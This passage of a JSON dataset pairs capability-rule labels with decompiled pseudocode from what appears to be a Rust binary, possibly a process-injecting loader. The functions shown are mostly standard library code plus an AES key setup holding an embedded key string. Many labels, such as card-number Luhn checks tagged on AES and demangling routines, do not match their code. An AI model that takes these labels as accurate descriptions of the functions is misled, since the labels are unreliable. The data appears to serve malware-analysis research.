ZEXT816(uVar7) * ZEXT816(arg1);\n                uVar8 = SUB168(auVar4, 0);\n                if ((SUB168(auVar4 >> 0x40, 0) != 0) ||\n                   (bVar21 = CARRY8(uVar12, uVar8),  uVar12 = uVar12 + uVar8,  bVar21)) goto code_r0x00413bd9;\n                if (uVar7 < uVar17) break;\n                uVar20 = uVar20 + 0x24;\n                auVar4 = ZEXT816(arg1) * ZEXT816(0x24 - uVar17);\n                arg1 = SUB168(auVar4, 0);\n                bVar21 = true;\n                if (SUB168(auVar4 >> 0x40, 0) != 0) goto code_r0x00413bd9;\n            }\n            uVar18 = uVar9 + uVar12;\n            if (CARRY8(uVar9, uVar12)) goto code_r0x00413bd9;\n            uVar20 = uVar19 + 1;\n            if ((uVar18 | uVar20) >> 0x20 == 0) {\n                uVar9 = (uVar18 & 0xffffffff) / (uVar20 & 0xffffffff);\n                uVar18 = (uVar18 & 0xffffffff) % (uVar20 & 0xffffffff);\n            }\n            else {\n                uVar9 = uVar18 / uVar20;\n                uVar18 = uVar18 % uVar20;\n            }\n            if ((((CARRY8(uStack640, uVar9)) || (uStack640 = uStack640 + uVar9,  uStack640 >> 0x20 != 0)) ||\n                (uVar11 = uStack640,  (uVar11 ^ 0xd800) - 0x110000 < 0xffef0800)) ||\n               ((uVar11 == 0x110000 || (0x7f < uVar19)))) goto code_r0x00413bd9;\n            while (uVar18 < uVar19) {\n                uVar9 = uVar19 - 1;\n                if (0x7f < uVar9) {\n                    dbg.panic_bounds_check(0xffffffffffffffff, 0x80, 0x448ea8);\n                    do {\n                        invalidInstructionException();\n                    } while( true );\n                }\n                auStack576[uVar19] = auStack576[uVar9];\n                uVar19 = uVar9;\n            }\n            if (0x7f < uVar18) {\n                dbg.panic_bounds_check(uVar18, 0x80, 0x448ec0);\n                do {\n                    invalidInstructionException();\n                } while( true );\n            }\n            auStack576[uVar18] = uVar11;\n            if (puVar10 == puStack608 + puStack600) break;\n            uVar16 = *puVar10;\n            if (uVar12 >> 0x20 == 0) {\n                uVar12 = uVar12 & 0xffffffff;\n            }\n            uVar12 = uVar12 / uStack632;\n            if ((uVar12 | uVar20) >> 0x20 == 0) {\n                uVar19 = (uVar12 & 0xffffffff) / (uVar20 & 0xffffffff);\n            }\n            else {\n                uVar19 = uVar12 / uVar20;\n            }\n            uVar19 = uVar19 + uVar12;\n            iVar14 = 0;\n            uVar9 = uVar19;\n            if (0x1c7 < uVar19) {\n                do {\n                    uVar19 = uVar9 / 0x23;\n                    iVar14 = iVar14 + 0x24;\n                    bVar21 = 0x3e57 < uVar9;\n                    uVar9 = uVar19;\n                } while (bVar21);\n            }\n            uVar9 = uVar18 + 1;\n            uVar18 = (uVar19 * 0x24 & 0xffffU) / (uVar19 + 0x26U & 0xffff) + iVar14;\n            uStack632 = 2;\n            uVar19 = uVar20;\n        }\n        puVar15 = auStack576;\n        iVar14 = iStack616;\n        do {\n            uStack620 = *puVar15;\n            cVar5 = sym._char_as_core::fmt::Display_::fmt::h14326fedf7fcab8e(&uStack620, arg2);\n            if (cVar5 != '\\0') {\n                uVar19 = CONCAT71(&uStack620 >> 8, 1);\n                goto code_r0x00413c6b;\n            }\n            puVar15 = puVar15 + 1;\n            iVar14 = iVar14 + -4;\n        } while (iVar14 != 0);\n        uVar19 = 0;\n        goto code_r0x00413c6b;\n    }\n    uVar11 = (**(*(arg2 + 0x28) + 0x18))(*(arg2 + 0x20), *arg1, arg1[1]);\n    goto code_r0x00413c69;\ncode_r0x00413bd9:\n    uVar2 = *(arg2 + 0x20);\n    pcVar3 = *(*(arg2 + 0x28) + 0x18);\n    cVar5 = (*pcVar3)(uVar2, \"punycode{-}0\", 9);\n    uVar19 = CONCAT71(arg1 >> 8, 1);\n    if ((cVar5 != '\\0') ||\n       (((puStack584 != NULL &&\n         ((cVar5 = (*pcVar3)(uVar2, puStack592),  cVar5 != '\\0' || (cVar5 = (*pcVar3)(uVar2, \"-}0\", 1),  cVar5 != '\\0'))\n         )) || (cVar5 = (*pcVar3)(uVar2, puStack608, puStack600),  cVar5 != '\\0')))) goto code_r0x00413c6b;\n    uVar11 = (*pcVar3)(uVar2, \"}0\", 1);\ncode_r0x00413c69:\n    uVar19 = uVar11;\ncode_r0x00413c6b:\n    return uVar19 & 0xffffffff;\n}\n",
        "token_count": 2551
    },
    "efdbe7b2": {
        "rules": [
            "check OS version/55c4336dbd964ae3be35b3597c99c1c2"
        ],
        "decompiled_code": "\nuint64_t sym.gimli::read::unit::Attribute_R_::udata_value::hefdbe7b2bd46938d(int64_t *arg1)\n\n{\n    // gimli::read::unit::Attribute<R>::udata_value::hefdbe7b2bd46938d\n    if (*arg1 - 2U < 6) {\n    // switch table (6 cases) at 0x432078\n        switch(*((*arg1 - 2U) * 4 + 0x432078) + 0x432078) {\n        default:\n            return 1;\n        case 0x43204a:\n            return 1;\n        case 0x432054:\n            return 1;\n        case 0x43205e:\n            return 1;\n        case 0x432067:\n            return ~arg1[1] >> 0x3f;\n        }\n    }\n    return 0;\n}\n",
        "token_count": 206
    },
    "1c875f9a": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/73780005e39049dabd818a965d665a12",
            "validate payment card number using luhn algorithm with no lookup table/ddd7fbc99e2542de97c80e37351c10a7/bde1572c33fb4ad4a176b04786e84c23"
        ],
        "decompiled_code": "\nvoid sym.libaes::aes_set_encrypt_key::h1c875f9a0e924a3c(uint32_t *arg1)\n\n{\n    uint32_t uVar1;\n    uint32_t uVar2;\n    ulong arg1_00;\n    uint64_t arg2;\n    ulong arg3;\n    int64_t iVar3;\n    \n    // libaes::aes_set_encrypt_key::h1c875f9a0e924a3c\n    *(arg1 + 0x3c) = 0xe;\n    uVar1 = sym.libaes::get_u32::h0cc37895dca67686\n                      (\"aJdAQG9RXD3WAQrUQkzerbSGssgKLV5Va3fOjfJkYOupwqBOError allocating  memory to the target process: xFD\"\n                       , 4);\n    *arg1 = uVar1;\n    uVar1 = sym.libaes::get_u32::h0cc37895dca67686\n                      (\"QG9RXD3WAQrUQkzerbSGssgKLV5Va3fOjfJkYOupwqBOError allocating  memory to the target process: xFD\"\n                       , 4);\n    arg1[1] = uVar1;\n    uVar1 = sym.libaes::get_u32::h0cc37895dca67686\n                      (\"XD3WAQrUQkzerbSGssgKLV5Va3fOjfJkYOupwqBOError allocating  memory to the target process: xFD\", 4)\n    ;\n    arg1[2] = uVar1;\n    uVar1 = sym.libaes::get_u32::h0cc37895dca67686\n                      (\"AQrUQkzerbSGssgKLV5Va3fOjfJkYOupwqBOError allocating  memory to the target process: xFD\", 4);\n    arg1[3] = uVar1;\n    uVar1 = sym.libaes::get_u32::h0cc37895dca67686\n                      (\"QkzerbSGssgKLV5Va3fOjfJkYOupwqBOError allocating  memory to the target process: xFD\", 4);\n    arg1[4] = uVar1;\n    uVar1 = sym.libaes::get_u32::h0cc37895dca67686\n                      (\"rbSGssgKLV5Va3fOjfJkYOupwqBOError allocating  memory to the target process: xFD\", 4);\n    arg1[5] = uVar1;\n    uVar1 = sym.libaes::get_u32::h0cc37895dca67686\n                      (\"ssgKLV5Va3fOjfJkYOupwqBOError allocating  memory to the target process: xFD\", 4);\n    arg1[6] = uVar1;\n    uVar1 = sym.libaes::get_u32::h0cc37895dca67686\n                      (\"LV5Va3fOjfJkYOupwqBOError allocating  memory to the target process: xFD\", 4);\n    arg1[7] = uVar1;\n    arg2 = 0x3c;\n    iVar3 = 0;\n    do {\n        if (arg2 < 8) {\n            arg3 = 0x446090;\n            arg1_00 = 7;\ncode_r0x0040df85:\n            dbg.panic_bounds_check(arg1_00, arg2, arg3);\n            do {\n                invalidInstructionException();\n            } while( true );\n        }\n        if (arg2 == 8) {\n            arg3 = 0x4470d0;\n            arg1_00 = 8;\n            arg2 = 8;\n            goto code_r0x0040df85;\n        }\n        uVar1 = arg1[7];\n        uVar2 = *((uVar1 >> 0x18) * 4 + 0x446ca8) ^\n                str.cc[(uVar1 & 0xff) * 4] << 8 ^ *((uVar1 >> 8 & 0xff) * 4 + 0x4464aa) << 0x10 ^\n                *((uVar1 >> 0xe & 0x3fc) + 0x4460ab) << 0x18 ^ *arg1 ^ *(iVar3 + 0x4470a8);\n        arg1[8] = uVar2;\n        if (arg2 == 9) {\n            arg3 = 0x4470e8;\n            arg1_00 = 9;\n            arg2 = 9;\n            goto code_r0x0040df85;\n        }\n        uVar2 = uVar2 ^ arg1[1];\n        arg1[9] = uVar2;\n        if (arg2 < 0xb) {\n            arg3 = 0x447100;\n            arg1_00 = 10;\n            arg2 = 10;\n            goto code_r0x0040df85;\n        }\n        uVar2 = uVar2 ^ arg1[2];\n        arg1[10] = uVar2;\n        if (arg2 == 0xb) {\n            arg3 = 0x447118;\n            arg1_00 = 0xb;\n            arg2 = 0xb;\n            goto code_r0x0040df85;\n        }\n        uVar2 = uVar2 ^ arg1[3];\n        arg1[0xb] = uVar2;\n        if (iVar3 == 0x18) {\n            return;\n        }\n        if (arg2 < 0xd) {\n            arg3 = 0x447130;\n            arg1_00 = 0xc;\n            arg2 = 0xc;\n            goto code_r0x0040df85;\n        }\n        uVar2 = *((uVar2 & 0xff) * 4 + 0x446ca8) ^\n                str.cc[(uVar2 >> 8 & 0xff) * 4] << 8 ^ *((uVar2 >> 0xe & 0x3fc) + 0x4464aa) << 0x10 ^\n                *((uVar2 >> 0x18) * 4 + 0x4460ab) << 0x18 ^ arg1[4];\n        arg1[0xc] = uVar2;\n        if (arg2 == 0xd) {\n            arg3 = 0x447148;\n            arg1_00 = 0xd;\n            arg2 = 0xd;\n            goto code_r0x0040df85;\n        }\n        uVar2 = uVar2 ^ arg1[5];\n        arg1[0xd] = uVar2;\n        if (arg2 < 0xf) {\n            arg3 = 0x447160;\n            arg1_00 = 0xe;\n            arg2 = 0xe;\n            goto code_r0x0040df85;\n        }\n        uVar2 = uVar2 ^ arg1[6];\n        arg1[0xe] = uVar2;\n        if (arg2 == 0xf) {\n            arg3 = 0x447178;\n            arg1_00 = 0xf;\n            arg2 = 0xf;\n            goto code_r0x0040df85;\n        }\n        arg1[0xf] = uVar2 ^ uVar1;\n        arg1 = sym._ZN4core5slice5index77__LT_impl_u20_core..ops..index..IndexMut_LT_I_GT__u20_for_u20__u5b_T_u5d__GT_9index_mut17h1e00ae32d9db78\n                         (arg1, arg2, 8);\n        iVar3 = iVar3 + 4;\n    } while( true );\n}\n",
        "token_count": 1739
    },
    "e5dfd22f": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/101d11b5106849ad963488c88a9294b9",
            "validate payment card number using luhn algorithm with lookup table/77a25ea9f6f245cfb8807f7953974472"
        ],
        "decompiled_code": "\nvoid sym.rustc_demangle::v0::Parser::disambiguator::he5dfd22f02ae4114(uchar *arg1, int64_t *arg2)\n\n{\n    uint64_t uVar1;\n    uchar uVar2;\n    uint64_t uVar3;\n    uint64_t uVar4;\n    int64_t iVar5;\n    char cVar6;\n    uint8_t uVar7;\n    uint64_t uVar8;\n    \n    // rustc_demangle::v0::Parser::disambiguator::he5dfd22f02ae4114\n    uVar1 = arg2[1];\n    uVar8 = arg2[2];\n    if (((uVar8 < uVar1) && (iVar5 = *arg2,  iVar5 != 0)) && (*(iVar5 + uVar8) == 's')) {\n        uVar4 = uVar8 + 1;\n        arg2[2] = uVar4;\n        if (uVar4 < uVar1) {\n            cVar6 = *(iVar5 + uVar4);\n            uVar8 = uVar8 + 2;\n            if (cVar6 == '_') {\n                arg2[2] = uVar8;\n                iVar5 = 0;\n            }\n            else {\n                uVar4 = 0;\n                do {\n                    uVar7 = cVar6 - 0x30;\n                    if (9 < uVar7) {\n                        if (cVar6 + 0x9fU < 0x1a) {\n                            uVar7 = cVar6 + 0xa9;\n                        }\n                        else {\n                            if (0x19 < cVar6 + 0xbfU) goto code_r0x004138b3;\n                            uVar7 = cVar6 - 0x1d;\n                        }\n                    }\n                    arg2[2] = uVar8;\n                    uVar3 = SUB168(ZEXT816(uVar4) * ZEXT816(0x3e), 0);\n                    if (((SUB168(ZEXT816(uVar4) * ZEXT816(0x3e) >> 0x40, 0) != 0) ||\n                        (uVar4 = uVar3 + uVar7,  CARRY8(uVar3, uVar7))) || (uVar1 == uVar8)) goto code_r0x004138b3;\n                    cVar6 = *(iVar5 + uVar8);\n                    uVar8 = uVar8 + 1;\n                } while (cVar6 != '_');\n                arg2[2] = uVar8;\n                iVar5 = uVar4 + 1;\n                if (iVar5 == 0) goto code_r0x004138b3;\n            }\n            if (iVar5 + 1 != 0) {\n                *(arg1 + 8) = iVar5 + 1;\n                goto code_r0x00413848;\n            }\n        }\ncode_r0x004138b3:\n        arg1[1] = 0;\n        uVar2 = 1;\n    }\n    else {\n        *(arg1 + 8) = 0;\ncode_r0x00413848:\n        uVar2 = 0;\n    }\n    *arg1 = uVar2;\n    return;\n}\n",
        "token_count": 718
    },
    "93efaf2a": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/101d11b5106849ad963488c88a9294b9",
            "validate payment card number using luhn algorithm with lookup table/77a25ea9f6f245cfb8807f7953974472"
        ],
        "decompiled_code": "\nvoid sym.rustc_demangle::v0::Parser::hex_nibbles::h93efaf2aace0717a(uchar *arg1, int64_t *arg2)\n\n{\n    char cVar1;\n    int64_t arg1_00;\n    uint64_t arg3;\n    uint64_t arg2_00;\n    uchar uVar2;\n    int64_t iVar3;\n    int64_t iVar4;\n    uint64_t arg4;\n    \n    // rustc_demangle::v0::Parser::hex_nibbles::h93efaf2aace0717a\n    arg1_00 = *arg2;\n    if (arg1_00 != 0) {\n        arg3 = arg2[2];\n        arg2_00 = arg2[1];\n        iVar4 = 0;\n        do {\n            iVar3 = iVar4;\n            if (arg2_00 <= arg3 + iVar3) goto code_r0x00415b98;\n            cVar1 = *(arg1_00 + arg3 + iVar3);\n            arg2[2] = arg3 + 1 + iVar3;\n            iVar4 = iVar3 + 1;\n        } while ((cVar1 - 0x30U < 10) || (cVar1 + 0x9fU < 6));\n        if (cVar1 == '_') {\n            arg4 = (arg3 + iVar4) - 1;\n            if (arg4 < arg3) goto code_r0x00415b8e;\n            if (arg3 != 0) {\n                if (arg3 < arg2_00) {\n                    if (*(arg1_00 + arg3) < -0x40) {\ncode_r0x00415b8e:\n                        dbg.slice_error_fail(arg1_00, arg2_00, arg3, arg4);\n                        do {\n                            invalidInstructionException();\n                        } while( true );\n                    }\n                }\n                else if (arg3 != arg2_00) goto code_r0x00415b8e;\n            }\n            *(arg1 + 8) = arg1_00 + arg3;\n            *(arg1 + 0x10) = iVar3;\n            uVar2 = 0;\n            goto code_r0x00415b9e;\n        }\n    }\ncode_r0x00415b98:\n    arg1[1] = 0;\n    uVar2 = 1;\ncode_r0x00415b9e:\n    *arg1 = uVar2;\n    return;\n}\n",
        "token_count": 553
    },
    "bcabcdd3": {
        "rules": [
            "check OS version/4b1f5bfe83db45b5a81c3c2e0ddf7ce2"
        ],
        "decompiled_code": "\nvoid sym.core::fmt::num::imp::__impl_core::fmt::Display_for_u64_::fmt::hbcabcdd33be495c5(uint64_t *arg1, ulong arg2)\n\n{\n    bool bVar1;\n    int64_t iVar2;\n    uint64_t uVar3;\n    uint64_t uVar4;\n    uint32_t uVar5;\n    uint32_t uVar6;\n    uchar auStack64 [8];\n    char acStack56 [40];\n    \n    // core::fmt::num::imp::_<impl core::fmt::Display for u64>::fmt::hbcabcdd33be495c5\n    uVar4 = *arg1;\n    auStack64 = 0x27;\n    if (9999 < uVar4) {\n        iVar2 = 0x27;\n        uVar3 = uVar4;\n        do {\n            uVar4 = uVar3 / 10000;\n            uVar5 = uVar3 + uVar4 * -10000;\n            uVar6 = ((uVar5 & 0xffff) >> 2) / 0x19;\n            auStack64 = iVar2 + -4;\n            *(auStack64 + iVar2 + 5) =\n                 *(\n                  str.00010203040506070809101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899\n                  + uVar6 * 2);\n            *(auStack64 + iVar2 + 7) =\n                 *(\n                  str.00010203040506070809101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899\n                  + (uVar5 + uVar6 * -100 & 0xffff) * 2);\n            bVar1 = 99999999 < uVar3;\n            iVar2 = auStack64;\n            uVar3 = uVar4;\n        } while (bVar1);\n    }\n    uVar3 = uVar4;\n    if (99 < uVar4) {\n        uVar5 = ((uVar4 & 0xffff) >> 2) / 0x19;\n        uVar3 = uVar5;\n        *(auStack64 + auStack64 + 7) =\n             *(\n              str.00010203040506070809101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899\n              + (uVar4 + uVar5 * -100 & 0xffff) * 2);\n        auStack64 = auStack64 + -2;\n    }\n    if (uVar3 < 10) {\n        acStack56[auStack64] = uVar3 + '0';\n        auStack64 = auStack64 + -1;\n    }\n    else {\n        *(auStack64 + auStack64 + 7) =\n             *(\n              str.00010203040506070809101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899\n              + uVar3 * 2);\n        auStack64 = auStack64 + -2;\n    }\n    auStack64 = 0x27 - auStack64;\n    dbg.pad_integral(arg2, CONCAT71(auStack64 >> 8, 1), \n                     \"cannot access a Thread Local Storage value during or after destruction/rustc/a55dd71d5fb0ec5a6a3a9e8c27b2127ba491ce52\\\\library\\\\std\\\\src\\\\thread\\\\local.rs\"\n                     , 0);\n    return;\n}\n",
        "token_count": 933
    },
    "51116d82": {
        "rules": [
            "check OS version/4b1f5bfe83db45b5a81c3c2e0ddf7ce2",
            "check OS version/4b1f5bfe83db45b5a81c3c2e0ddf7ce2"
        ],
        "decompiled_code": "\nvoid sym.core::fmt::num::__impl_core::fmt::Debug_for_usize_::fmt::h51116d825aa44950(uint64_t *arg1, int64_t arg2)\n\n{\n    bool bVar1;\n    uint8_t uVar2;\n    int64_t iVar3;\n    int64_t iVar4;\n    uint64_t uVar5;\n    uint64_t uVar6;\n    unkbyte7 Var7;\n    char cVar8;\n    uint32_t uVar9;\n    uint32_t uVar10;\n    char *arg3;\n    uchar *puVar11;\n    uchar *puVar12;\n    ulong arg4;\n    ushort uStack148;\n    char acStack145 [128];\n    char cStack17;\n    \n    // core::fmt::num::_<impl core::fmt::Debug for usize>::fmt::h51116d825aa44950\n    puVar11 = &stack0xfffffffffffffff0;\n    puVar12 = &stack0xfffffffffffffff0;\n    if ((*(arg2 + 0x30) & 0x10) == 0) {\n        if ((*(arg2 + 0x30) & 0x20) == 0) {\n            uVar6 = *arg1;\n            iVar3 = 0x27;\n            if (9999 < uVar6) {\n                iVar4 = 0x27;\n                uVar5 = uVar6;\n                do {\n                    uVar6 = uVar5 / 10000;\n                    uVar9 = uVar5 + uVar6 * -10000;\n                    uVar10 = ((uVar9 & 0xffff) >> 2) / 0x19;\n                    iVar3 = iVar4 + -4;\n                    *(&uStack148 + iVar4) =\n                         *(\n                          str.00010203040506070809101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899\n                          + uVar10 * 2);\n                    *(&stack0xffffffffffffff6e + iVar4) =\n                         *(\n                          str.00010203040506070809101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899\n                          + (uVar9 + uVar10 * -100 & 0xffff) * 2);\n                    bVar1 = 99999999 < uVar5;\n                    iVar4 = iVar3;\n                    uVar5 = uVar6;\n                } while (bVar1);\n            }\n            uVar5 = uVar6;\n            if (99 < uVar6) {\n                uVar9 = ((uVar6 & 0xffff) >> 2) / 0x19;\n                uVar5 = uVar9;\n                *(&stack0xffffffffffffff6e + iVar3) =\n                     *(\n                      str.00010203040506070809101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899\n                      + (uVar6 + uVar9 * -100 & 0xffff) * 2);\n                iVar3 = iVar3 + -2;\n            }\n            if (uVar5 < 10) {\n                (&stack0xffffffffffffff6e)[iVar3 + 1] = uVar5 + '0';\n                iVar3 = iVar3 + -1;\n            }\n            else {\n                *(&stack0xffffffffffffff6e + iVar3) =\n                     *(\n                      str.00010203040506070809101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899\n                      + uVar5 * 2);\n                iVar3 = iVar3 + -2;\n            }\n            arg3 = \n            \"cannot access a Thread Local Storage value during or after destruction/rustc/a55dd71d5fb0ec5a6a3a9e8c27b2127ba491ce52\\\\library\\\\std\\\\src\\\\thread\\\\local.rs\"\n            ;\n            Var7 = 0x27 - iVar3 >> 8;\n            arg4 = 0;\n            goto code_r0x00407c39;\n        }\n        iVar3 = 0;\n        uVar6 = *arg1;\n        do {\n            uVar5 = uVar6 >> 4;\n            uVar2 = uVar6 & 0xf;\n            cVar8 = '7';\n            if (uVar2 < 10) {\n                cVar8 = '0';\n            }\n            puVar12[-1] = cVar8 + uVar2;\n            puVar12 = puVar12 + -1;\n            iVar3 = iVar3 + 1;\n            bVar1 = 0xf < uVar6;\n            uVar6 = uVar5;\n        } while (bVar1);\n    }\n    else {\n        iVar3 = 0;\n        uVar6 = *arg1;\n        do {\n            uVar5 = uVar6 >> 4;\n            uVar2 = uVar6 & 0xf;\n            cVar8 = 'W';\n            if (uVar2 < 10) {\n                cVar8 = '0';\n            }\n            puVar11[-1] = cVar8 + uVar2;\n            puVar11 = puVar11 + -1;\n            iVar3 = iVar3 + 1;\n            bVar1 = 0xf < uVar6;\n            uVar6 = uVar5;\n        } while (bVar1);\n    }\n    if (0x80 < 0x80U - iVar3) {\n        dbg.slice_start_index_len_fail(0x80U - iVar3, 0x80);\n        do {\n            invalidInstructionException();\n        } while( true );\n    }\n    arg3 = 0x44910b;\n    arg4 = 2;\n    Var7 = uVar5 >> 8;\ncode_r0x00407c39:\n    dbg.pad_integral(arg2, CONCAT71(Var7, 1), arg3, arg4);\n    return;\n}\n",
        "token_count": 1456
    },
    "49805a7e": {
        "rules": [
            "check OS version/4b1f5bfe83db45b5a81c3c2e0ddf7ce2"
        ],
        "decompiled_code": "\nvoid sym.core::fmt::num::imp::__impl_core::fmt::Display_for_u32_::fmt::h49805a7e5d3b869c(uint32_t *arg1, ulong arg2)\n\n{\n    bool bVar1;\n    int64_t iVar2;\n    uint64_t uVar3;\n    uint64_t uVar4;\n    uint32_t uVar5;\n    uint32_t uVar6;\n    uchar auStack64 [8];\n    char acStack56 [40];\n    \n    // core::fmt::num::imp::_<impl core::fmt::Display for u32>::fmt::h49805a7e5d3b869c\n    uVar4 = *arg1;\n    auStack64 = 0x27;\n    if (9999 < uVar4) {\n        iVar2 = 0x27;\n        uVar3 = uVar4;\n        do {\n            uVar4 = uVar3 / 10000;\n            uVar5 = uVar3 + uVar4 * -10000;\n            uVar6 = ((uVar5 & 0xffff) >> 2) / 0x19;\n            auStack64 = iVar2 + -4;\n            *(auStack64 + iVar2 + 5) =\n                 *(\n                  str.00010203040506070809101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899\n                  + uVar6 * 2);\n            *(auStack64 + iVar2 + 7) =\n                 *(\n                  str.00010203040506070809101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899\n                  + (uVar5 + uVar6 * -100 & 0xffff) * 2);\n            bVar1 = 99999999 < uVar3;\n            iVar2 = auStack64;\n            uVar3 = uVar4;\n        } while (bVar1);\n    }\n    uVar3 = uVar4;\n    if (99 < uVar4) {\n        uVar5 = ((uVar4 & 0xffff) >> 2) / 0x19;\n        uVar3 = uVar5;\n        *(auStack64 + auStack64 + 7) =\n             *(\n              str.00010203040506070809101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899\n              + (uVar4 + uVar5 * -100 & 0xffff) * 2);\n        auStack64 = auStack64 + -2;\n    }\n    if (uVar3 < 10) {\n        acStack56[auStack64] = uVar3 + '0';\n        auStack64 = auStack64 + -1;\n    }\n    else {\n        *(auStack64 + auStack64 + 7) =\n             *(\n              str.00010203040506070809101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899\n              + uVar3 * 2);\n        auStack64 = auStack64 + -2;\n    }\n    auStack64 = 0x27 - auStack64;\n    dbg.pad_integral(arg2, CONCAT71(auStack64 >> 8, 1), \n                     \"cannot access a Thread Local Storage value during or after destruction/rustc/a55dd71d5fb0ec5a6a3a9e8c27b2127ba491ce52\\\\library\\\\std\\\\src\\\\thread\\\\local.rs\"\n                     , 0);\n    return;\n}\n",
        "token_count": 939
    },
    "6354deed": {
        "rules": [
            "check OS version/4b1f5bfe83db45b5a81c3c2e0ddf7ce2"
        ],
        "decompiled_code": "\nvoid sym.core::fmt::num::imp::__impl_core::fmt::Display_for_u8_::fmt::h6354deedafde71de(ulong noname_0, ulong arg2)\n\n{\n    uint8_t uVar1;\n    int64_t iVar2;\n    char acStack39 [37];\n    ushort uStack2;\n    \n    // core::fmt::num::imp::_<impl core::fmt::Display for u8>::fmt::h6354deedafde71de\n    if (noname_0 < 100) {\n        iVar2 = 0x26;\n        if (9 < noname_0) {\n            uStack2 = *(\n                       str.00010203040506070809101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899\n                       + noname_0 * 2);\n            iVar2 = 0x25;\n            goto code_r0x0040a2d1;\n        }\n    }\n    else {\n        uVar1 = noname_0 + (noname_0 + noname_0 * 4) * 8 >> 0xc;\n        uStack2 = *(\n                   str.00010203040506070809101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899\n                   + (noname_0 + uVar1 * -100) * 2);\n        iVar2 = 0x24;\n        noname_0._0_1_ = uVar1;\n    }\n    acStack39[iVar2] = noname_0 + 0x30;\ncode_r0x0040a2d1:\n    dbg.pad_integral(arg2, CONCAT71(0x27 - iVar2 >> 8, 1), \n                     \"cannot access a Thread Local Storage value during or after destruction/rustc/a55dd71d5fb0ec5a6a3a9e8c27b2127ba491ce52\\\\library\\\\std\\\\src\\\\thread\\\\local.rs\"\n                     , 0);\n    return;\n}\n",
        "token_count": 529
    },
    "6bd14c60": {
        "rules": [
            "check OS version/4b1f5bfe83db45b5a81c3c2e0ddf7ce2"
        ],
        "decompiled_code": "\nvoid sym.core::fmt::num::__impl_core::fmt::LowerHex_for_i8_::fmt::h6bd14c6066d90b0f(ulong arg1, ulong arg2)\n\n{\n    uint8_t uVar1;\n    char cVar3;\n    uchar *puVar4;\n    int64_t iVar5;\n    uint64_t uVar6;\n    char cStack9;\n    uint8_t uVar2;\n    \n    // core::fmt::num::_<impl core::fmt::LowerHex for i8>::fmt::h6bd14c6066d90b0f\n    puVar4 = &stack0xfffffffffffffff8;\n    iVar5 = 0;\n    uVar6 = arg1;\n    do {\n        uVar2 = arg1;\n        uVar1 = uVar2 & 0xf;\n        uVar6 = uVar6 >> 4 & 0xf;\n        cVar3 = 'W';\n        if (uVar1 < 10) {\n            cVar3 = '0';\n        }\n        puVar4[-1] = cVar3 + uVar1;\n        puVar4 = puVar4 + -1;\n        iVar5 = iVar5 + 1;\n        arg1._0_4_ = uVar6;\n    } while (0xf < uVar2);\n    if (0x80U - iVar5 < 0x81) {\n        dbg.pad_integral(arg2, CONCAT71(arg2 >> 8, 1), 0x44910b, 2);\n        return;\n    }\n    dbg.slice_start_index_len_fail(0x80U - iVar5, 0x80);\n    do {\n        invalidInstructionException();\n    } while( true );\n}\n",
        "token_count": 375
    },
    "d734179c": {
        "rules": [
            "check OS version/4b1f5bfe83db45b5a81c3c2e0ddf7ce2"
        ],
        "decompiled_code": "\nvoid sym._T_as_core::fmt::Debug_::fmt::hd734179c781f6f53(uint8_t **arg1, int64_t arg2)\n\n{\n    uint8_t *puVar1;\n    bool bVar2;\n    uint8_t uVar3;\n    int64_t iVar4;\n    char cVar5;\n    uchar *puVar6;\n    uchar *puVar7;\n    char *arg3;\n    ulong arg4;\n    uint8_t uVar8;\n    char acStack136 [37];\n    ushort uStack99;\n    char cStack9;\n    \n    // <&T as core::fmt::Debug>::fmt::hd734179c781f6f53\n    puVar6 = &stack0xfffffffffffffff8;\n    puVar7 = &stack0xfffffffffffffff8;\n    puVar1 = *arg1;\n    if ((*(arg2 + 0x30) & 0x10) == 0) {\n        if ((*(arg2 + 0x30) & 0x20) == 0) {\n            uVar8 = *puVar1;\n            if (uVar8 < 100) {\n                iVar4 = 0x26;\n                if (uVar8 < 10) goto code_r0x0040ac03;\n                uStack99 = *(\n                            str.00010203040506070809101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899\n                            + uVar8 * 2);\n            }\n            else {\n                uVar3 = uVar8 + (uVar8 + uVar8 * 4) * 8 >> 0xc;\n                uStack99 = *(\n                            str.00010203040506070809101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899\n                            + (uVar8 + uVar3 * -100) * 2);\n                iVar4 = 0x24;\n                uVar8 = uVar3;\ncode_r0x0040ac03:\n                acStack136[iVar4] = uVar8 + 0x30;\n            }\n            arg3 = \n            \"cannot access a Thread Local Storage value during or after destruction/rustc/a55dd71d5fb0ec5a6a3a9e8c27b2127ba491ce52\\\\library\\\\std\\\\src\\\\thread\\\\local.rs\"\n            ;\n            arg4 = 0;\n            goto code_r0x0040ac49;\n        }\n        iVar4 = 0;\n        uVar8 = *puVar1;\n        do 